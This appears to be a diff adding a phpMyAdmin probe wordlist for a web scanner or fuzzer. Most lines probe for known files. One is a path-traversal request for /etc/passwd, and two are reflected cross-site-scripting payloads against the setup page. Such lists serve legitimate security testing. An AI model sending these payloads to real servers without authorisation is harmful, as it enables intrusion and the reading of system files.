@@ -1,0 +1,9 @@
+/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+{{paths}}
+/phpmyadmin/libraries/advisory_rules_generic.php
+/phpmyadmin/libraries/phpseclib/Crypt/AES.php
+/phpmyadmin/libraries/phpseclib/Crypt/Rijndael.php
+/phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/phpmyadmin/index.php?db=information_schema
+/phpMyAdmin/index.php?db=information_schema
